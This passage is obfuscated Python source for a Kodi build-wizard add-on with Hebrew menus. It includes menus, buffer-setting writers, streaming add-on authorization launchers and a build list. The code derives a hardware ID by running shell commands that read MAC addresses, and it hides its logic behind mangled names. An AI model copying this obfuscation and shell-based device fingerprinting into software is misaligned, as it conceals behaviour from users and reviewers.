    OO00O0OO0OO000O00 =(O0O0000O00OOOOOO0 [1 ]+O0O0000O00OOOOOO0 [2 ]+O0O0000O00OOOOOO0 [5 ]+O0O0000O00OOOOOO0 [7 ])#line:1644
    OOO0O0O00O0O0OO0O =(ADDON .getSetting ("action"))#line:1645
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OO00O0OO0OO000O00 )#line:1648
   except :pass #line:1649
def getHwAddr (OO000O0O0O0O00OO0 ):#line:1651
   import subprocess ,time #line:1652
   O000O000O0O0OO0OO ='windows'#line:1653
   if xbmc .getCondVisibility ('system.platform.android'):#line:1654
       O000O000O0O0OO0OO ='android'#line:1655
   if xbmc .getCondVisibility ('system.platform.android'):#line:1656
     OOO0OOOOOO000OO00 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1657
     OO00O0O0000OOO0OO =re .compile ('link/ether (.+?) brd').findall (str (OOO0OOOOOO000OO00 ))#line:1659
     OO0OOOO0O0O000000 =0 #line:1660
     for O00OOO0O0OO000OOO in OO00O0O0000OOO0OO :#line:1661
      if OO00O0O0000OOO0OO !='00:00:00:00:00:00':#line:1662
          OO000O00O000O00OO =O00OOO0O0OO000OOO #line:1663
          OO0OOOO0O0O000000 =OO0OOOO0O0O000000 +int (OO000O00O000O00OO .replace (':',''),16 )#line:1664
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1666
       OOO00O00OOOOOOO00 =0 #line:1667
       OO0OOOO0O0O000000 =0 #line:1668
       O0OO000OO0O0O0O0O =[]#line:1669
       OOOOO000OOOO000OO =os .popen ("getmac").read ()#line:1670
       OOOOO000OOOO000OO =OOOOO000OOOO000OO .split ("\n")#line:1671
       for OOOO00OO0O000O0O0 in OOOOO000OOOO000OO :#line:1673
            OO00OO00000OOO000 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOOO00OO0O000O0O0 ,re .I )#line:1674
            if OO00OO00000OOO000 :#line:1675
                OO00O0O0000OOO0OO =OO00OO00000OOO000 .group ().replace ('-',':')#line:1676
                O0OO000OO0O0O0O0O .append (OO00O0O0000OOO0OO )#line:1677
                OO0OOOO0O0O000000 =OO0OOOO0O0O000000 +int (OO00O0O0000OOO0OO .replace (':',''),16 )#line:1680
   else :#line:1682
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1683
   try :#line:1700
    return OO0OOOO0O0O000000 #line:1701
   except :pass #line:1702
def getpass ():#line:1703
	disply_hwr2 ()#line:1705
def setpass ():#line:1706
    OO00OOO00OOO00OO0 =xbmcgui .Dialog ()#line:1707
    O00OOOO00OOO0OOOO =''#line:1708
    O0OO0OOOOO000O0O0 =xbmc .Keyboard (O00OOOO00OOO0OOOO ,'הכנס סיסמה')#line:1710
    O0OO0OOOOO000O0O0 .doModal ()#line:1711
    if O0OO0OOOOO000O0O0 .isConfirmed ():#line:1712
           O0OO0OOOOO000O0O0 =O0OO0OOOOO000O0O0 .getText ()#line:1713
    wiz .setS ('pass',str (O0OO0OOOOO000O0O0 ))#line:1714
def setuname ():#line:1715
    OOO0OO0O00O00OOO0 =''#line:1716
    OO0O00OO0OOO000OO =xbmc .Keyboard (OOO0OO0O00O00OOO0 ,'הכנס שם משתמש')#line:1717
    OO0O00OO0OOO000OO .doModal ()#line:1718
    if OO0O00OO0OOO000OO .isConfirmed ():#line:1719
           OOO0OO0O00O00OOO0 =OO0O00OO0OOO000OO .getText ()#line:1720
           wiz .setS ('user',str (OOO0OO0O00O00OOO0 ))#line:1721
def powerkodi ():#line:1722
    os ._exit (1 )#line:1723
def buffer1 ():#line:1725
	O00O0OO0OOO00O00O =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1726
	O000O00OO00OOOO0O =xbmc .getInfoLabel ("System.Memory(total)")#line:1727
	OOO0OO0OOO000O0O0 =xbmc .getInfoLabel ("System.FreeMemory")#line:1728
	OO0O00OO0O000O0OO =re .sub ('[^0-9]','',OOO0OO0OOO000O0O0 )#line:1729
	OO0O00OO0O000O0OO =int (OO0O00OO0O000O0OO )/3 #line:1730
	OO0O00OOOOO00OOOO =OO0O00OO0O000O0OO *1024 *1024 #line:1731
	try :O00OOOO0OO0O0O0O0 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1732
	except :O00OOOO0OO0O0O0O0 =16 #line:1733
	OOO00OO00OOOOO000 =DIALOG .yesno ('FREE MEMORY: '+str (OOO0OO0OOO000O0O0 ),'Based on your free Memory your optimal buffersize is: '+str (OO0O00OO0O000O0OO )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1736
	if OOO00OO00OOOOO000 ==1 :#line:1737
		with open (O00O0OO0OOO00O00O ,"w")as OO0000OO0OOO00000 :#line:1738
			if O00OOOO0OO0O0O0O0 >=17 :OO00O0O0O000OOOO0 =xml_data_advSettings_New (str (OO0O00OOOOO00OOOO ))#line:1739
			else :OO00O0O0O000OOOO0 =xml_data_advSettings_old (str (OO0O00OOOOO00OOOO ))#line:1740
			OO0000OO0OOO00000 .write (OO00O0O0O000OOOO0 )#line:1742
			DIALOG .ok ('Buffer Size Set to: '+str (OO0O00OOOOO00OOOO ),'Please restart Kodi for settings to apply.','')#line:1743
	elif OOO00OO00OOOOO000 ==0 :#line:1745
		OO0O00OOOOO00OOOO =_O000O0OO0O0O00O0O (default =str (OO0O00OOOOO00OOOO ),heading ="INPUT BUFFER SIZE")#line:1746
		with open (O00O0OO0OOO00O00O ,"w")as OO0000OO0OOO00000 :#line:1747
			if O00OOOO0OO0O0O0O0 >=17 :OO00O0O0O000OOOO0 =xml_data_advSettings_New (str (OO0O00OOOOO00OOOO ))#line:1748
			else :OO00O0O0O000OOOO0 =xml_data_advSettings_old (str (OO0O00OOOOO00OOOO ))#line:1749
			OO0000OO0OOO00000 .write (OO00O0O0O000OOOO0 )#line:1750
			DIALOG .ok ('Buffer Size Set to: '+str (OO0O00OOOOO00OOOO ),'Please restart Kodi for settings to apply.','')#line:1751
def xml_data_advSettings_old (OOOO0000O0O0O000O ):#line:1752
	O0O0OOO00OO00OOO0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OOOO0000O0O0O000O #line:1762
	return O0O0OOO00OO00OOO0 #line:1763
def xml_data_advSettings_New (OOO0O0O0OO0OOOO00 ):#line:1765
	OO0OO0000OO000OO0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OOO0O0O0OO0OOOO00 #line:1777
	return OO0OO0000OO000OO0 #line:1778
def write_ADV_SETTINGS_XML (OOO000OO0O000OO00 ):#line:1779
    if not os .path .exists (xml_file ):#line:1780
        with open (xml_file ,"w")as O0OOOOOO0000OO0OO :#line:1781
            O0OOOOOO0000OO0OO .write (xml_data )#line:1782
def _O000O0OO0O0O00O0O (default ="",heading ="",hidden =False ):#line:1783
    ""#line:1784
    O0OOOO0OO0O00O00O =xbmc .Keyboard (default ,heading ,hidden )#line:1785
    O0OOOO0OO0O00O00O .doModal ()#line:1786
    if (O0OOOO0OO0O00O00O .isConfirmed ()):#line:1787
        return unicode (O0OOOO0OO0O00O00O .getText (),"utf-8")#line:1788
    return default #line:1789
def index ():#line:1791
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1792
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1793
	if AUTOUPDATE =='Yes':#line:1794
		if wiz .workingURL (WIZARDFILE )==True :#line:1795
			OO0O000OO00OOO000 =wiz .checkWizard ('version')#line:1796
			if OO0O000OO00OOO000 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OO0O000OO00OOO000 ),'wizardupdate',themeit =THEME2 )#line:1797
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1798
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1799
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1800
	if len (BUILDNAME )>0 :#line:1801
		OOO0OOO00OO000OO0 =wiz .checkBuild (BUILDNAME ,'version')#line:1802
		OOO00000O0OO000OO ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:1803
		if OOO0OOO00OO000OO0 >BUILDVERSION :OOO00000O0OO000OO ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OOO00000O0OO000OO ,OOO0OOO00OO000OO0 )#line:1804
		addDir (OOO00000O0OO000OO ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:1806
		try :#line:1808
		     OO00O0O0O0OOO00OO =wiz .themeCount (BUILDNAME )#line:1809
		except :#line:1810
		   OO00O0O0O0OOO00OO =False #line:1811
		if not OO00O0O0O0OOO00OO ==False :#line:1812
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:1813
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:1814
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1817
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1818
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1819
	addFile ('אימות חשבון + RD','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1823
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1825
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1827
def morsetup ():#line:1829
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1830
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1831
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:1832
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1833
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1837
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1838
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:1841
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1842
	addFile ('הגדר מצב RD','rdon',icon =ICONMAINT ,themeit =THEME1 )#line:1844
	addFile ('ביטול מצב RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:1845
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1853
	setView ('files','viewType')#line:1854
def morsetup2 ():#line:1855
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:1856
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1857
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1858
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1859
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1860
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1861
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1862
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1863
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1864
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1865
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1866
def fastupdate ():#line:1867
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:1868
def forcefastupdate ():#line:1870
			O0OOOOOOO00O0O0O0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1871
			wiz .ForceFastUpDate (ADDONTITLE ,O0OOOOOOO00O0O0O0 )#line:1872
def rdsetup ():#line:1876
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.resolveurl)'):#line:1877
		xbmc .executebuiltin ("InstallAddon(script.module.resolveurl)")#line:1878
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.urlresolver)'):#line:1879
		xbmc .executebuiltin ("InstallAddon(script.module.urlresolver)")#line:1880
	addFile ('[COLOR red]ResolverUrl[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','resolveurl',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1881
	addFile ('[COLOR blue]URLResolver[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','urlresolver',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1882
	setView ('files','viewType')#line:1883
def traktsetup ():#line:1885
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1886
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1887
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1888
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1889
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1890
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1891
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1892
	setView ('files','viewType')#line:1893
def resolveurlsetup ():#line:1895
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1896
def urlresolversetup ():#line:1897
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1898
def placentasetup ():#line:1900
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1901
def reptiliasetup ():#line:1902
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1903
def flixnetsetup ():#line:1904
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1905
def yodasetup ():#line:1906
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1907
def numberssetup ():#line:1908
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1909
def uranussetup ():#line:1910
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1911
def genesissetup ():#line:1912
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1913
def net_tools (view =None ):#line:1915
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1916
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1917
	setView ('files','viewType')#line:1919
def speedMenu ():#line:1920
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:1921
def viewIP ():#line:1922
	O0O0OO0O000O0O000 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1936
	O0000OOOO00O00000 =[];O0O0000O0000OOOO0 =0 #line:1937
	for OO000O0OO00OO00OO in O0O0OO0O000O0O000 :#line:1938
		OO0OOOO0O00OOOO0O =wiz .getInfo (OO000O0OO00OO00OO )#line:1939
		OOOOOOOO0O0OO0OO0 =0 #line:1940
		while OO0OOOO0O00OOOO0O =="Busy"and OOOOOOOO0O0OO0OO0 <10 :#line:1941
			OO0OOOO0O00OOOO0O =wiz .getInfo (OO000O0OO00OO00OO );OOOOOOOO0O0OO0OO0 +=1 ;wiz .log ("%s sleep %s"%(OO000O0OO00OO00OO ,str (OOOOOOOO0O0OO0OO0 )));xbmc .sleep (1000 )#line:1942
		O0000OOOO00O00000 .append (OO0OOOO0O00OOOO0O )#line:1943
		O0O0000O0000OOOO0 +=1 #line:1944
	O0O0O00OOO0O000O0 ,OOOO000O0O0000O0O ,OOOOO0000O0000000 =getIP ()#line:1945
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000OOOO00O00000 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1946
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O00OOO0O000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1947
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO000O0O0000O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1948
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0000O0000000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1949
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000OOOO00O00000 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1950
	setView ('files','viewType')#line:1951
def buildMenu ():#line:1953
	if USERNAME =='':#line:1954
		ADDON .openSettings ()#line:1955
		sys .exit ()#line:1956
	if PASSWORD =='':#line:1957
		ADDON .openSettings ()#line:1958
	OO00O0O0OOOO0O0OO =u_list (SPEEDFILE )#line:1959
	(OO00O0O0OOOO0O0OO )#line:1960
	O00O000OOOO000OO0 =(wiz .workingURL (OO00O0O0OOOO0O0OO ))#line:1961
	(O00O000OOOO000OO0 )#line:1962
	O00O000OOOO000OO0 =wiz .workingURL (SPEEDFILE )#line:1963
	if not O00O000OOOO000OO0 ==True :#line:1964
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1965
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1966
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1967
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:1968
		addFile ('%s'%O00O000OOOO000OO0 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1969
	else :#line:1970
		O000O0O000O0OOO0O ,O0OOOOO00OO0OO0O0 ,OOO00OO000O000000 ,O00O0O0O0O00O00O0 ,OO0000OOO0O0O0O00 ,O0O0OO000O000000O ,O0000O000O00OO0O0 =wiz .buildCount ()#line:1971
		O0O0O00O00O00OO0O =False ;O0OOO0000OO00O0O0 =[]#line:1972
		if THIRDPARTY =='true':#line:1973
			if not THIRD1NAME ==''and not THIRD1URL =='':O0O0O00O00O00OO0O =True ;O0OOO0000OO00O0O0 .append ('1')#line:1974
			if not THIRD2NAME ==''and not THIRD2URL =='':O0O0O00O00O00OO0O =True ;O0OOO0000OO00O0O0 .append ('2')#line:1975
			if not THIRD3NAME ==''and not THIRD3URL =='':O0O0O00O00O00OO0O =True ;O0OOO0000OO00O0O0 .append ('3')#line:1976
		O00O000OOO0000000 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:1977
		OO0O00OO0OOOO0OO0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00O000OOO0000000 )#line:1978
		if O000O0O000O0OOO0O ==1 and O0O0O00O00O00OO0O ==False :#line:1979
			for O00OOOO0OOOO0O00O ,OO00O0OOOOO0O0OO0 ,OOOO0O0O0OOOOO0OO ,OOOO00000OOOO0O0O ,O000O0OOOO00OOOO0 ,O00OOO000O0OO0O0O ,OOOO000000OOOO0OO ,OO00OO0O0OO0OO000 ,O00O000O000O00O0O ,O0OO0OO00OO0OO0OO in OO0O00OO0OOOO0OO0 :#line:1980
				if not SHOWADULT =='true'and O00O000O000O00O0O .lower ()=='yes':continue #line:1981
				if not DEVELOPER =='true'and wiz .strTest (O00OOOO0OOOO0O00O ):continue #line:1982
				viewBuild (OO0O00OO0OOOO0OO0 [0 ][0 ])#line:1983
				return #line:1984
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1987
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1988
		if O0O0O00O00O00OO0O ==True :#line:1989
			for OO00OOOOOO00000OO in O0OOO0000OO00O0O0 :#line:1990
				O00OOOO0OOOO0O00O =eval ('THIRD%sNAME'%OO00OOOOOO00000OO )#line:1991
		if len (OO0O00OO0OOOO0OO0 )>=1 :#line:1993
			if SEPERATE =='true':#line:1994
				for O00OOOO0OOOO0O00O ,OO00O0OOOOO0O0OO0 ,OOOO0O0O0OOOOO0OO ,OOOO00000OOOO0O0O ,O000O0OOOO00OOOO0 ,O00OOO000O0OO0O0O ,OOOO000000OOOO0OO ,OO00OO0O0OO0OO000 ,O00O000O000O00O0O ,O0OO0OO00OO0OO0OO in OO0O00OO0OOOO0OO0 :#line:1995
					if not SHOWADULT =='true'and O00O000O000O00O0O .lower ()=='yes':continue #line:1996
					if not DEVELOPER =='true'and wiz .strTest (O00OOOO0OOOO0O00O ):continue #line:1997
					O00000O00OOOO0O00 =createMenu ('install','',O00OOOO0OOOO0O00O )#line:1998
					addDir ('[%s] %s (v%s)'%(float (O000O0OOOO00OOOO0 ),O00OOOO0OOOO0O00O ,OO00O0OOOOO0O0OO0 ),'viewbuild',O00OOOO0OOOO0O00O ,description =O0OO0OO00OO0OO0OO ,fanart =OO00OO0O0OO0OO000 ,icon =OOOO000000OOOO0OO ,menu =O00000O00OOOO0O00 ,themeit =THEME2 )#line:1999
			else :#line:2000
				if O00O0O0O0O00O00O0 >0 :#line:2001
					O0OOO0OOO0OO00O00 ='+'if SHOW17 =='false'else '-'#line:2002
					if SHOW17 =='true':#line:2004
						for O00OOOO0OOOO0O00O ,OO00O0OOOOO0O0OO0 ,OOOO0O0O0OOOOO0OO ,OOOO00000OOOO0O0O ,O000O0OOOO00OOOO0 ,O00OOO000O0OO0O0O ,OOOO000000OOOO0OO ,OO00OO0O0OO0OO000 ,O00O000O000O00O0O ,O0OO0OO00OO0OO0OO in OO0O00OO0OOOO0OO0 :#line:2006
							if not SHOWADULT =='true'and O00O000O000O00O0O .lower ()=='yes':continue #line:2007
							if not DEVELOPER =='true'and wiz .strTest (O00OOOO0OOOO0O00O ):continue #line:2008
							OOO00O00O0O00OO00 =int (float (O000O0OOOO00OOOO0 ))#line:2009
							if OOO00O00O0O00OO00 ==17 :#line:2010
								O00000O00OOOO0O00 =createMenu ('install','',O00OOOO0OOOO0O00O )#line:2011
								addDir ('[%s] %s (v%s)'%(float (O000O0OOOO00OOOO0 ),O00OOOO0OOOO0O00O ,OO00O0OOOOO0O0OO0 ),'viewbuild',O00OOOO0OOOO0O00O ,description =O0OO0OO00OO0OO0OO ,fanart =OO00OO0O0OO0OO000 ,icon =OOOO000000OOOO0OO ,menu =O00000O00OOOO0O00 ,themeit =THEME2 )#line:2012
				if OO0000OOO0O0O0O00 >0 :#line:2013
					O0OOO0OOO0OO00O00 ='+'if SHOW18 =='false'else '-'#line:2014
					if SHOW18 =='true':#line:2016
						for O00OOOO0OOOO0O00O ,OO00O0OOOOO0O0OO0 ,OOOO0O0O0OOOOO0OO ,OOOO00000OOOO0O0O ,O000O0OOOO00OOOO0 ,O00OOO000O0OO0O0O ,OOOO000000OOOO0OO ,OO00OO0O0OO0OO000 ,O00O000O000O00O0O ,O0OO0OO00OO0OO0OO in OO0O00OO0OOOO0OO0 :#line:2018
							if not SHOWADULT =='true'and O00O000O000O00O0O .lower ()=='yes':continue #line:2019
							if not DEVELOPER =='true'and wiz .strTest (O00OOOO0OOOO0O00O ):continue #line:2020
							OOO00O00O0O00OO00 =int (float (O000O0OOOO00OOOO0 ))#line:2021
							if OOO00O00O0O00OO00 ==18 :#line:2022
								O00000O00OOOO0O00 =createMenu ('install','',O00OOOO0OOOO0O00O )#line:2023
								addDir ('[%s] %s (v%s)'%(float (O000O0OOOO00OOOO0 ),O00OOOO0OOOO0O00O ,OO00O0OOOOO0O0OO0 ),'viewbuild',O00OOOO0OOOO0O00O ,description =O0OO0OO00OO0OO0OO ,fanart =OO00OO0O0OO0OO000 ,icon =OOOO000000OOOO0OO ,menu =O00000O00OOOO0O00 ,themeit =THEME2 )#line:2024
				if OOO00OO000O000000 >0 :#line:2025
					O0OOO0OOO0OO00O00 ='+'if SHOW16 =='false'else '-'#line:2026
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0OOO0OOO0OO00O00 ,OOO00OO000O000000 ),'togglesetting','show16',themeit =THEME3 )#line:2027
					if SHOW16 =='true':#line:2028
						for O00OOOO0OOOO0O00O ,OO00O0OOOOO0O0OO0 ,OOOO0O0O0OOOOO0OO ,OOOO00000OOOO0O0O ,O000O0OOOO00OOOO0 ,O00OOO000O0OO0O0O ,OOOO000000OOOO0OO ,OO00OO0O0OO0OO000 ,O00O000O000O00O0O ,O0OO0OO00OO0OO0OO in OO0O00OO0OOOO0OO0 :#line:2029
							if not SHOWADULT =='true'and O00O000O000O00O0O .lower ()=='yes':continue #line:2030
							if not DEVELOPER =='true'and wiz .strTest (O00OOOO0OOOO0O00O ):continue #line:2031
							OOO00O00O0O00OO00 =int (float (O000O0OOOO00OOOO0 ))#line:2032
							if OOO00O00O0O00OO00 ==16 :#line:2033
								O00000O00OOOO0O00 =createMenu ('install','',O00OOOO0OOOO0O00O )#line:2034
								addDir ('[%s] %s (v%s)'%(float (O000O0OOOO00OOOO0 ),O00OOOO0OOOO0O00O ,OO00O0OOOOO0O0OO0 ),'viewbuild',O00OOOO0OOOO0O00O ,description =O0OO0OO00OO0OO0OO ,fanart =OO00OO0O0OO0OO000 ,icon =OOOO000000OOOO0OO ,menu =O00000O00OOOO0O00 ,themeit =THEME2 )#line:2035
				if O0OOOOO00OO0OO0O0 >0 :#line:2036
					O0OOO0OOO0OO00O00 ='+'if SHOW15 =='false'else '-'#line:2037
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0OOO0OOO0OO00O00 ,O0OOOOO00OO0OO0O0 ),'togglesetting','show15',themeit =THEME3 )#line:2038
					if SHOW15 =='true':#line:2039
						for O00OOOO0OOOO0O00O ,OO00O0OOOOO0O0OO0 ,OOOO0O0O0OOOOO0OO ,OOOO00000OOOO0O0O ,O000O0OOOO00OOOO0 ,O00OOO000O0OO0O0O ,OOOO000000OOOO0OO ,OO00OO0O0OO0OO000 ,O00O000O000O00O0O ,O0OO0OO00OO0OO0OO in OO0O00OO0OOOO0OO0 :#line:2040
							if not SHOWADULT =='true'and O00O000O000O00O0O .lower ()=='yes':continue #line:2041
							if not DEVELOPER =='true'and wiz .strTest (O00OOOO0OOOO0O00O ):continue #line:2042
							OOO00O00O0O00OO00 =int (float (O000O0OOOO00OOOO0 ))#line:2043
							if OOO00O00O0O00OO00 <=15 :#line:2044
								O00000O00OOOO0O00 =createMenu ('install','',O00OOOO0OOOO0O00O )#line:2045
